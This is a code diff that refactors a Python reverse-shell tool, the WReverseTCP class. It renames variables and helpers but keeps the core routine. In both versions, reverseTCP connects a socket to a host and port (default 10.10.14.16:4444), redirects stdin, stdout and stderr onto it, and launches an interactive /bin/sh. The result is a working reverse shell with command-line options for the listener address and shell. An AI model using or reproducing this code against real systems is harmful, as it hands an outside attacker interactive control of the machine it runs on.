@@ -14,59 +14,63 @@ import traceback
 class WReverseTCP():
 
   VERSION = "1.0"
+  EMPTY = ""
 
-  def __init__(self, lhost="10.10.14.16", lport=4444, shell="/bin/sh"):
-    self.lhost = lhost  #type: str
-    self.lport = lport  #type: int
+  def __init__(self, localHost="10.10.14.16", localPort=4444, shell="/bin/sh"):
+    self.localHost = localHost  #type: str
+    self.localPort = localPort  #type: int
     self.shell = shell  #type: str
     self.parser = None  #type: argparse.ArgumentParser
-    self.args = None  #type: argparse.Namespace
+    self.parsedArgs = None  #type: argparse.Namespace
 
   @staticmethod
-  def toCamel(string, char="_"):  #type: (str,str) -> str
-    camel = ""
-    strings = string.split(char)
-    length = len(strings)
-    for i in range(length):
-      s = strings[i]
-      if (i == 0):
-        camel += s.lower()
+  def toCamelCase(string, delimiter="_"):  #type: (str, str) -> str
+    camelCasedString = WReverseTCP.EMPTY
+    strings = string.split(delimiter)
+    stringsLength = len(strings)
+    for index in range(stringsLength):
+      word = strings[index]
+      if (index == 0):
+        camelCasedString += word.lower()
       else:
-        camel += s[0].upper() + s[1:].lower()
-    return camel
+        camelCasedString += word[0].upper() + word[1:].lower()
+    return camelCasedString
 
   def parseArgs(self):  #type: (WReverseTCP) -> None
-    LH_HELP = "Specify your local ip address. Default is: {}".format(self.lhost)
-    LP_HELP = "Specify your local port. Default is: {}".format(self.lport)
+    LH_HELP = "Specify your local ip address. Default is: {}".format(self.localHost)
+    LP_HELP = "Specify your local port. Default is: {}".format(self.localPort)
     S_HELP = "Specify the shell to launch on successful reverse tcp. Default is: {}".format(self.shell)
     V_HELP = "Show version"
     H_HELP = "Show this help message"
     VERSION = "Reverse TCP version: {}".format(WReverseTCP.VERSION)
-    EMPTY = ""
+    EMPTY = WReverseTCP.EMPTY
 
     self.parser = argparse.ArgumentParser(add_help=False)
     parser = self.parser
-    parser.add_argument("-lh", "--lhost", help=LH_HELP, type=str, metavar=EMPTY, default=self.lhost)
-    parser.add_argument("-lp", "--lport", help=LP_HELP, type=int, metavar=EMPTY, default=self.lport)
+    parser.add_argument("-lh", "--lhost", help=LH_HELP, type=str, metavar=EMPTY, default=self.localHost)
+    parser.add_argument("-lp", "--lport", help=LP_HELP, type=int, metavar=EMPTY, default=self.localPort)
     parser.add_argument("-s", "--shell", help=S_HELP, type=str, metavar=EMPTY, default=self.shell)
     parser.add_argument("-v", "--version", action="version", help=V_HELP, version=VERSION)
     parser.add_argument("-h", "--help", action="help", help=H_HELP)
-    self.args = parser.parse_args()
+    self.parsedArgs = parser.parse_args()
 
   def setArguments(self):  #type: (WReverseTCP) -> None
-    args = self.args
-    vargs = vars(args)
-    for varg in vargs:
-      setattr(self, WReverseTCP.toCamel(varg), vargs[varg])
+    parsedArgsDict = vars(self.parsedArgs)
+    for parsedArgsKey in parsedArgsDict:
+      setattr(self, WReverseTCP.toCamelCase(parsedArgsKey), parsedArgsDict[parsedArgsKey])
 
   def reverseTCP(self):  #type: (WReverseTCP) -> None
-    print("Initiating connection: {}:{} {}".format(self.lhost, self.lport, self.shell))
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((self.lhost, self.lport))
-    os.dup2(s.fileno(), 0)
-    os.dup2(s.fileno(), 1)
-    os.dup2(s.fileno(), 2)
-    subprocess.call([self.shell, "-i"])
+    localHost = self.localHost
+    localPort = self.localPort
+    shell = self.shell
+    print("Initiating connection: {}:{} {}".format(localHost, localPort, shell))
+
+    _socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    _socket.connect((localHost, localPort))
+    os.dup2(_socket.fileno(), 0)
+    os.dup2(_socket.fileno(), 1)
+    os.dup2(_socket.fileno(), 2)
+    subprocess.call([shell, "-i"])
 
 
 def __main__():  #type: () -> None
